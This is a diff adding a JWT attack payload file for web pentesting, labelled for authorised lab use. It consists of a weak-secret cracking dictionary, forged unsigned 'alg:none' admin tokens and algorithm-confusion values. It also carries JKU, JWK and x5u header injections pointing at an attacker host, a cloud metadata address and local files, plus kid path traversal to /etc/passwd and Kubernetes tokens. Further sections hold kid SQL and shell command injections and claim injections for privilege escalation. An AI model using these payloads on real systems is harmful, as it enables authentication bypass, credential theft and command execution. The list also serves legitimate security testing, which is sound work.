@@ -1,0 +1,858 @@
+# payloads/web/jwt.txt
+# JWT attack payloads — AUTHORISED LAB USE ONLY
+# Advanced pentester edition — comprehensive coverage across all attack vectors
+# Includes common secrets, algorithm confusion, key confusion, and 2026-relevant techniques
+
+# ── Common weak secrets (brute-force dictionary) ────────────
+# These are used with hashcat or John to crack HS256 tokens
+secret
+password
+123456
+admin
+jwt_secret
+your-256-bit-secret
+your-secret
+mysecret
+supersecret
+qwerty
+abc123
+password123
+letmein
+changeme
+default
+test
+dev
+development
+production
+app_secret
+api_secret
+jwt-secret-key
+application_secret
+session_secret
+auth_secret
+hs256_secret
+jwtpassword
+jwt123
+secretkey
+privatekey
+signing_key
+token_secret
+shared_secret
+key
+12345678
+123456789
+1234567890
+qwerty123
+qwertyuiop
+asdfgh
+zxcvbn
+iloveyou
+monkey
+dragon
+master
+passw0rd
+p@ssword
+p@ssw0rd
+admin123
+admin1234
+administrator
+root
+toor
+guest
+user
+god
+trustno1
+sunshine
+princess
+welcome
+shadow
+football
+baseball
+hockey
+starwars
+solo
+prince
+batman
+superman
+12345678910
+qwerty12345
+asdfghjkl
+zxcvbnm
+pass123
+pass1234
+test123
+test1234
+test12345
+demo
+demo123
+sample
+example
+changethis
+changeme123
+default_password
+s3cr3t
+s3cret
+s3cr3t_k3y
+my-secret-key
+my-secret
+jwt-hs256-secret
+jwt-hs384-secret
+jwt-hs512-secret
+jwt-secret-123
+api-secret-key
+app-secret-key
+session-secret-key
+token-secret-key
+auth-secret-key
+signing-secret
+private-secret
+secret-key
+secret123
+secret1234
+very-secret
+very-secret-key
+not-so-secret
+top-secret
+ultra-secret
+mega-secret
+super-secret
+hyper-secret
+ultra-secure
+super-secure
+mega-secure
+jwt-key
+jwt-token
+jwt-signing-key
+jwt-signing-secret
+access-token-secret
+refresh-token-secret
+id-token-secret
+jwt-access-secret
+jwt-refresh-secret
+jwt-id-secret
+api-gateway-secret
+microservice-secret
+auth-service-secret
+user-service-secret
+order-service-secret
+payment-service-secret
+secret-key-123
+myapp-secret
+myapp-key
+webapp-secret
+webapp-key
+node-app-secret
+express-app-secret
+flask-app-secret
+django-app-secret
+spring-app-secret
+laravel-app-secret
+rails-app-secret
+next-app-secret
+nuxt-app-secret
+svelte-app-secret
+react-app-secret
+vue-app-secret
+angular-app-secret
+fastapi-app-secret
+go-app-secret
+rust-app-secret
+hackme
+pentest
+testkey
+devkey
+prodkey
+stagingkey
+localkey
+dockerkey
+k8s-secret
+kubernetes-secret
+openshift-secret
+cloud-secret
+aws-secret
+azure-secret
+gcp-secret
+heroku-secret
+vercel-secret
+netlify-secret
+railway-secret
+flyio-secret
+render-secret
+digitalocean-secret
+linode-secret
+vultr-secret
+ovh-secret
+do-secret
+gandi-secret
+namecheap-secret
+cloudflare-secret
+fastly-secret
+akamai-secret
+cloudfront-secret
+jsmith
+mjohnson
+dwilson
+jbrown
+jones
+mgarcia
+mmiller
+davis
+arodriguez
+mwilson
+mtaylor
+anderson
+thomas
+jackson
+white
+harris
+martin
+thompson
+moore
+hill
+walker
+young
+allen
+king
+wright
+scott
+green
+baker
+adams
+nelson
+carter
+mitchell
+roberts
+turner
+phillips
+campbell
+parker
+evans
+edwards
+collins
+stewart
+morris
+rogers
+reed
+cook
+morgan
+bell
+murphy
+bailey
+rivera
+cooper
+richardson
+cox
+howard
+ward
+torres
+peterson
+gray
+ramirez
+james
+watson
+brooks
+kelly
+sanders
+price
+bennett
+wood
+barnes
+ross
+henderson
+coleman
+jenkins
+perry
+powell
+long
+patterson
+hughes
+flores
+washington
+butler
+simmons
+foster
+gonzales
+bryant
+alexander
+russell
+griffin
+diaz
+hayes
+changeme
+changeme123
+mustchange
+resetme
+resetme123
+temporary
+temp123
+temp_password
+temporary_password
+onetime
+onetime123
+one-time-secret
+firstime
+newsecret
+newkey
+newpassword
+welcome2024
+welcome2025
+welcome2026
+summer2024
+summer2025
+summer2026
+winter2024
+winter2025
+winter2026
+spring2024
+spring2025
+spring2026
+fall2024
+fall2025
+fall2026
+2024secret
+2025secret
+2026secret
+secret2024
+secret2025
+secret2026
+key2024
+key2025
+key2026
+password2024
+password2025
+password2026
+admin2024
+admin2025
+admin2026
+test2024
+test2025
+test2026
+jwtsecret2024
+jwtsecret2025
+jwtsecret2026
+a
+aa
+aaa
+aaaa
+aaaaa
+aaaaaa
+aaaaaaa
+aaaaaaaa
+aaaaaaaaa
+aaaaaaaaaa
+abc
+abcd
+abcde
+abcdef
+abcdefg
+abcdefgh
+abcdefghi
+0123456789
+01234567890
+111111
+222222
+333333
+444444
+555555
+666666
+777777
+888888
+999999
+000000
+123123
+123321
+1111111
+1234567
+7654321
+123456789a
+123456789b
+123456789c
+qwerty123456
+qwerty1234567
+q1w2e3r4t5y6
+1q2w3e4r5t6y
+passw0rd
+P@ssw0rd
+P@$$w0rd
+P@55w0rd
+s3cur3
+s3cur3k3y
+s3cur3_p4ss
+s3cur3-t0k3n
+s3cr3t-k3y
+s3cr3t_t0k3n
+s3cr3t_p4ss
+my-s3cr3t
+my-s3cr3t-k3y
+jwt-s3cr3t
+jwt-s3cr3t-k3y
+t0p-s3cr3t
+t0p-s3cr3t-k3y
+ult1m4t3-s3cr3t
+ult1m4t3-s3cur3
+4dm1n
+4dm1n-k3y
+4dm1n-s3cr3t
+r00t
+r00t-k3y
+r00t-s3cr3t
+p3nt3st
+p3nt3st-k3y
+p3nt3st-s3cr3t
+h4ckm3
+h4ckm3-k3y
+h4ck3d
+h4ck3d-k3y
+0r4ng3
+0r4ng3-k3y
+blu3t34m
+blu3t34m-k3y
+r3ddr4g0n
+r3ddr4g0n-k3y
+bl4ckh4t
+bl4ckh4t-k3y
+wh1t3h4t
+wh1t3h4t-k3y
+gr3yh4t
+gr3yh4t-k3y
+
+# ── Algorithm confusion attack vectors ──────────────────────
+# Set alg to "none" with empty signature
+# Payload: {"alg":"none","typ":"JWT"}
+# Signature: (empty)
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0.
+eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0.
+eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0.
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0.
+eyJ0eXAiOiJKV1QiLCJhbGciOiJOT05FIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0.
+eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0.
+
+# Algorithm confusion: none with various casing
+# HS256 with public key as secret
+# RS256 - use public key to verify as HMAC
+# Set alg from RS256 to HS256, use public key file content as secret
+
+# ── Algorithm: none (empty signature) ──────────────────────
+{"alg":"none","typ":"JWT"}
+{"alg":"None","typ":"JWT"}
+{"alg":"NONE","typ":"JWT"}
+{"alg":"noNe","typ":"JWT"}
+{"alg":"nOnE","typ":"JWT"}
+{"typ":"JWT","alg":"none"}
+{"typ":"JWT","alg":"None"}
+{"typ":"JWT","alg":"NONE"}
+{"alg":"none"}
+{"alg":"None"}
+{"alg":"NONE"}
+{"alg":"nOnE"}
+
+# ── Algorithm: null (null signature) ───────────────────────
+{"alg":null,"typ":"JWT"}
+{"alg":null}
+{"typ":"JWT","alg":null}
+{"alg":"null","typ":"JWT"}
+
+# ── Algorithm: symmetric (HS256/HS384/HS512) ────────────────
+# These work when the server expects RS256 but you switch to HS256
+# using the public key as the HMAC secret
+HS256
+HS384
+HS512
+HS2256
+HS2384
+HS2512
+hs256
+hs384
+hs512
+Hs256
+Hs384
+Hs512
+HmacSHA256
+HmacSHA384
+HmacSHA512
+hmac-sha256
+hmac-sha384
+hmac-sha512
+HMAC-SHA256
+HMAC-SHA384
+HMAC-SHA512
+
+# ── Algorithm: asymmetric (RS256/RS384/RS512/ES256/ES384/ES512)
+RS256
+RS384
+RS512
+RS2256
+RS2384
+RS2512
+rs256
+rs384
+rs512
+Rs256
+Rs384
+Rs512
+RsaSHA256
+RsaSHA384
+RsaSHA512
+rsa-sha256
+rsa-sha384
+rsa-sha512
+RSA-SHA256
+RSA-SHA384
+RSA-SHA512
+Sha256WithRSA
+ES256
+ES384
+ES512
+ES2256
+ES2384
+ES2512
+es256
+es384
+es512
+Es256
+Es384
+Es512
+EcdsaSHA256
+EcdsaSHA384
+EcdsaSHA512
+ecdsa-sha256
+ecdsa-sha384
+ecdsa-sha512
+ECDSA-SHA256
+ECDSA-SHA384
+ECDSA-SHA512
+Sha256WithECDSA
+
+# ── Algorithm: post-quantum (2026 modern) ──────────────────
+CRYSTALS-Dilithium
+CRYSTALS.Dilithium
+CRYSTALS_Dilithium
+Dilithium2
+Dilithium3
+Dilithium5
+Dilithium
+dilithium
+DILITHIUM
+FALCON
+Falcon
+falcon
+FALCON-512
+FALCON-1024
+FALCON512
+FALCON1024
+falcon512
+falcon1024
+Falcon512
+Falcon1024
+Falcon-512
+Falcon-1024
+SPHINCS+
+SPHINCSPlus
+SPHINCS_Plus
+SPHINCS-Plus
+sphincs+
+sphincsplus
+SPHINCS+-SHA256
+SPHINCS+-SHAKE256
+
+# ── Algorithm: legacy / weak ────────────────────────────────
+HS1
+HS2
+HS3
+HS4
+HS8
+HS16
+HS32
+HS64
+HS128
+HS0
+none
+None
+NONE
+NoNe
+nOnE
+NON3
+N0NE
+n0ne
+null
+NULL
+Null
+undefined
+UNDEFINED
+true
+True
+TRUE
+false
+False
+FALSE
+1
+0
+-1
+
+# ── Key confusion: use public key as HMAC secret ────────────
+# If the server's public key is known, try these JWT formatted
+# with HS256 algorithm and the public key content as the secret
+# Format: base64url(header).base64url(payload).base64url(sign)
+# with header: {"alg":"HS256","typ":"JWT"}
+# HS256 signed with RSA public key PEM content
+
+# ── JWK header injection ────────────────────────────────────
+# Inject embedded JWK in header (jwk parameter)
+{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","n":"...your_public_key_n...","e":"AQAB"}}
+{"alg":"ES256","typ":"JWT","jwk":{"kty":"EC","crv":"P-256","x":"...","y":"..."}}
+{"alg":"RS256","jwk":{"kty":"RSA","n":"...","e":"AQAB"}}
+{"alg":"HS256","jwk":{"kty":"oct","k":"...base64_hmac_secret..."}}
+
+# ── JKU header injection ────────────────────────────────────
+# Inject JKU (JWK Set URL) pointing to attacker-controlled JWKS
+{"alg":"RS256","typ":"JWT","jku":"https://attacker.example.com/jwks.json"}
+{"alg":"RS256","jku":"https://attacker.example.com/jwks.json"}
+{"alg":"RS256","jku":"http://attacker.example.com/jwks.json"}
+{"alg":"ES256","jku":"http://attacker.example.com/jwks.json"}
+{"alg":"RS384","jku":"https://attacker.example.com/jwks.json"}
+{"alg":"RS512","jku":"https://attacker.example.com/jwks.json"}
+{"alg":"RS256","jku":"http://169.254.169.254/latest/meta-data/"}
+{"alg":"RS256","jku":"file:///etc/passwd"}
+{"alg":"RS256","jku":"data://text/plain;base64,eyJrdHkiOiJSU0EiLCJuIjoiLi4uIiwiZSI6IkFRQUIifQ=="}
+{"alg":"HS256","jku":"http://localhost:3333/jwks.json"}
+
+# ── Kid header injection (Key ID path traversal) ────────────
+{"alg":"HS256","typ":"JWT","kid":"../../../etc/passwd"}
+{"alg":"HS256","kid":"../../../etc/passwd"}
+{"alg":"RS256","kid":"/proc/self/environ"}
+{"alg":"HS256","kid":"/etc/passwd"}
+{"alg":"HS256","kid":"../../../../etc/passwd"}
+{"alg":"HS256","kid":"../../../../etc/passwd%00"}
+{"alg":"HS256","kid":"../../../../var/log/apache2/access.log"}
+{"alg":"RS256","kid":"../../../../proc/self/environ"}
+{"alg":"HS256","kid":"../../../../dev/null"}
+{"alg":"HS256","kid":"../../../../etc/hostname"}
+{"alg":"HS256","kid":"/var/www/html/config.php"}
+{"alg":"HS256","kid":"file:///etc/passwd"}
+{"alg":"HS256","kid":"/etc/passwd;id"}
+{"alg":"HS256","kid":"../../../../etc/passwd`id`"}
+{"alg":"HS256","kid":"../../../../etc/passwd$(id)"}
+{"alg":"HS256","kid":"../../../../tmp/test"}
+{"alg":"HS256","kid":"../../../../var/run/secrets/kubernetes.io/serviceaccount/token"}
+
+# ── Kid header injection (SQL injection) ────────────────────
+{"alg":"HS256","kid":"' OR '1'='1"}
+{"alg":"HS256","kid":"' UNION SELECT 'secret'--"}
+{"alg":"HS256","kid":"' UNION SELECT @@version--"}
+{"alg":"HS256","kid":"a' OR 1=1--"}
+{"alg":"HS256","kid":"' OR '1'='1' /*"}
+{"alg":"HS256","kid":"a' UNION SELECT 'test'-- -"}
+{"alg":"HS256","kid":"' AND SLEEP(5)--"}
+{"alg":"HS256","kid":"' AND 1=1--"}
+
+# ── Kid header injection (command injection) ────────────────
+{"alg":"HS256","kid":";id;"}
+{"alg":"HS256","kid":"|id|"}
+{"alg":"HS256","kid":"`id`"}
+{"alg":"HS256","kid":"$(id)"}
+{"alg":"HS256","kid":";ls /"}
+{"alg":"HS256","kid":"|cat /etc/passwd"}
+{"alg":"HS256","kid":";cat /etc/passwd;"}
+{"alg":"HS256","kid":"\";id;\""}
+{"alg":"HS256","kid":"';id;'"}
+
+# ── Kid header injection (noise / edge cases) ───────────────
+{"alg":"HS256","kid":""}
+{"alg":"HS256","kid":null}
+{"alg":"HS256","kid":[]}
+{"alg":"HS256","kid":{}}
+{"alg":"HS256","kid":0}
+{"alg":"HS256","kid":1}
+{"alg":"HS256","kid":true}
+{"alg":"HS256","kid":false}
+{"alg":"HS256","kid":"*"}
+{"alg":"HS256","kid":"**"}
+{"alg":"HS256","kid":".."}
+{"alg":"HS256","kid":"..."}
+{"alg":"HS256","kid":"."}
+{"alg":"HS256","kid":"/"}
+{"alg":"HS256","kid":"%00"}
+{"alg":"HS256","kid":" "}
+{"alg":"HS256","kid":"\\x00"}
+{"alg":"HS256","kid":"admin"}
+{"alg":"HS256","kid":"secret"}
+
+# ── Typ header injection ──────────────────────────────────
+{"typ":"JWT","alg":"none"}
+{"typ":"JWT","alg":"None"}
+{"typ":"jwt","alg":"none"}
+{"typ":"jwt","alg":"nOnE"}
+{"typ":"access_token","alg":"none"}
+{"typ":"refresh_token","alg":"none"}
+{"typ":"id_token","alg":"none"}
+{"typ":"at+jwt","alg":"none"}
+{"typ":"application/at+jwt","alg":"none"}
+{"typ":"urn:ietf:params:oauth:token-type:access_token","alg":"none"}
+
+# ── Claim injections ────────────────────────────────────────
+# Role / privilege escalation
+{"sub":"1234567890","name":"John Doe","admin":true,"iat":1516239022}
+{"sub":"1234567890","name":"John Doe","admin":1,"iat":1516239022}
+{"sub":"1234567890","name":"John Doe","admin":"true","iat":1516239022}
+{"sub":"1234567890","name":"John Doe","role":"admin","iat":1516239022}
+{"sub":"1234567890","name":"John Doe","role":"administrator","iat":1516239022}
+{"sub":"1234567890","name":"John Doe","role":"superadmin","iat":1516239022}
+{"sub":"1234567890","name":"John Doe","role":"root","iat":1516239022}
+{"sub":"1234567890","name":"John Doe","role":"user","iat":1516239022}
+{"sub":"1234567890","name":"John Doe","scope":"admin","iat":1516239022}
+{"sub":"1234567890","name":"John Doe","scope":"admin:all","iat":1516239022}
+{"sub":"1234567890","name":"John Doe","scope":"*","iat":1516239022}
+{"sub":"1234567890","name":"John Doe","scope":"read write delete","iat":1516239022}
+{"sub":"1234567890","name":"John Doe","permissions":["admin","superuser"],"iat":1516239022}
+{"sub":"1234567890","name":"John Doe","groups":["admin"],"iat":1516239022}
+{"sub":"1234567890","name":"John Doe","is_admin":true,"iat":1516239022}
+{"sub":"1234567890","name":"John Doe","isAdmin":true,"iat":1516239022}
+{"sub":"1234567890","name":"John Doe","isStaff":true,"iat":1516239022}
+{"sub":"1234567890","name":"John Doe","is_superuser":true,"iat":1516239022}
+
+# ── Claim injection: impersonation ──────────────────────────
+{"sub":"admin","name":"John Doe","iat":1516239022}
+{"sub":"administrator","name":"John Doe","iat":1516239022}
+{"sub":"root","name":"John Doe","iat":1516239022}
+{"sub":"superadmin","name":"John Doe","iat":1516239022}
+{"sub":"1","name":"John Doe","iat":1516239022}
+{"sub":0,"iat":1516239022}
+{"sub":null,"iat":1516239022}
+{"sub":"","iat":1516239022}
+{"sub":[],"iat":1516239022}
+{"preferred_username":"admin","iat":1516239022}
+{"email":"admin@example.com","iat":1516239022}
+{"upn":"administrator@domain.local","iat":1516239022}
+{"client_id":"admin","iat":1516239022}
+{"client_id":"admin-cli","iat":1516239022}
+
+# ── Expiration / NBF bypass ─────────────────────────────────
+{"sub":"1234567890","name":"John Doe","iat":1,"exp":9999999999}
+{"sub":"1234567890","name":"John Doe","iat":0,"exp":9999999999}
+{"sub":"1234567890","name":"John Doe","iat":1516239022,"exp":null}
+{"sub":"1234567890","name":"John Doe","iat":1516239022,"exp":0}
+{"sub":"1234567890","name":"John Doe","iat":1516239022,"nbf":1}
+{"sub":"1234567890","name":"John Doe","iat":1516239022,"nbf":null}
+{"sub":"1234567890","name":"John Doe","iat":1516239022,"exp":1516239022}
+{"sub":"1234567890","name":"John Doe","iat":1516239022,"nbf":9999999999}
+
+# ── Audience / issuer confusion ────────────────────────────
+{"sub":"1234567890","iss":"https://attacker.example.com","iat":1516239022}
+{"sub":"1234567890","iss":"attacker","iat":1516239022}
+{"sub":"1234567890","aud":"https://attacker.example.com","iat":1516239022}
+{"sub":"1234567890","aud":"attacker","iat":1516239022}
+{"sub":"1234567890","iss":"http://localhost:3333","iat":1516239022}
+{"sub":"1234567890","iss":"http://localhost:3333/","iat":1516239022}
+{"sub":"1234567890","iss":"127.0.0.1","iat":1516239022}
+{"sub":"1234567890","iss":"localhost","iat":1516239022}
+{"sub":"1234567890","azp":"attacker","iat":1516239022}
+
+# ── Critical header injection ──────────────────────────────
+{"alg":"HS256","typ":"JWT","crit":["exp"],"exp":9999999999}
+{"alg":"HS256","typ":"JWT","crit":[],"exp":9999999999}
+{"alg":"HS256","typ":"JWT","crit":["http://attacker.example.com/custom"]}
+
+# ── Cty header (Content Type) ─────────────────────────────
+{"alg":"HS256","typ":"JWT","cty":"nested"}
+{"alg":"HS256","typ":"JWT","cty":"JWT"}
+
+# ── X.509 URL injection ────────────────────────────────────
+{"alg":"RS256","typ":"JWT","x5u":"https://attacker.example.com/cert.pem"}
+{"alg":"RS256","typ":"JWT","x5u":"http://attacker.example.com/cert.pem"}
+{"alg":"RS256","typ":"JWT","x5u":"file:///etc/passwd"}
+{"alg":"RS256","typ":"JWT","x5u":"data://text/plain;base64,c29tZSBjZXJ0Cg=="}
+{"alg":"RS256","typ":"JWT","x5c":["MIID...your_malicious_cert..."]}
+{"alg":"RS256","typ":"JWT","x5c":["MIID...cert1...","MIID...cert2..."]}
+{"alg":"RS256","typ":"JWT","x5t":"MTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTI="}
+{"alg":"RS256","typ":"JWT","x5t#S256":"MTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTI="}
+
+# ── Custom / proprietary algorithm headers ─────────────────
+{"alg":"custom","typ":"JWT"}
+{"alg":"internal","typ":"JWT"}
+{"alg":"debug","typ":"JWT"}
+{"alg":"test","typ":"JWT"}
+{"alg":"dev","typ":"JWT"}
+{"alg":"internal-hs256","typ":"JWT"}
+{"alg":"custom-hmac","typ":"JWT"}
+{"alg":"A256GCM","typ":"JWT"}
+{"alg":"A128GCM","typ":"JWT"}
+{"alg":"A256CBC-HS512","typ":"JWT"}
+{"alg":"A128CBC-HS256","typ":"JWT"}
+{"alg":"dir","typ":"JWT"}
+
+# ── JWE (encrypted) header manipulation ────────────────────
+{"alg":"RSA-OAEP-256","enc":"A256GCM","typ":"JWE"}
+{"alg":"RSA-OAEP","enc":"A256GCM","typ":"JWE"}
+{"alg":"RSA1_5","enc":"A256CBC-HS512","typ":"JWE"}
+{"alg":"RSA1_5","enc":"A128CBC-HS256","typ":"JWE"}
+{"alg":"ECDH-ES","enc":"A256GCM","typ":"JWE"}
+{"alg":"ECDH-ES+A256KW","enc":"A256GCM","typ":"JWE"}
+{"alg":"dir","enc":"A256GCM","typ":"JWE"}
+
+# ── Token manipulation: encoding variants ──────────────────
+# Replace + with -, / with _, remove padding =
+# Original: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.signature
+# URL-safe variants
+# Truncated signature
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.
+
+# ── Token with modified signature (invalid / tampered) ─────
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0.ZmFrZVNpZ25hdHVyZQ
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0.YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY=
+
+# ── JWT with B64 header (skip base64 encoding of payload) ──
+{"alg":"HS256","typ":"JWT","b64":false}
+# Payload sent as raw JSON without base64 encoding
+
+# ── EdDSA / Edwards curve ─────────────────────────────────
+EdDSA
+Ed25519
+Ed448
+eddsa
+ed25519
+ed448
+Eddsa
+Ed25519
+Ed448
+
+# ── OAuth / OpenID Connect confusion ──────────────────────
+{"alg":"RS256","typ":"at+jwt"}
+{"alg":"RS256","typ":"application/at+jwt"}
+{"alg":"RS256","typ":"application/jwt"}
+{"alg":"HS256","typ":"at+jwt"}
+{"alg":"RS256","typ":"access_token+jwt"}
+{"alg":"RS256","typ":"access_token"}
+
+# ── Auth0 / Firebase / common IDP secrets ────────────────
+auth0-secret
+auth0-hs256-secret
+auth0-client-secret
+firebase-secret
+firebase-hs256-secret
+firebase-admin-secret
+cognito-secret
+cognito-pool-secret
+keycloak-secret
+keycloak-client-secret
+okta-secret
+okta-client-secret
+azure-ad-secret
+azure-ad-client-secret
+auth0
+firebase
+cognito
+keycloak
+okta
+azure-ad
+
+# ── JWT split / unicode secrets ────────────────────────────
+# Some JWT libraries treat these differently
+\u0000
+\u0000secret
+secret\u0000
+\u0000\u0000\u0000
+\\x00secret
+secret\\x00
+null
+\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000
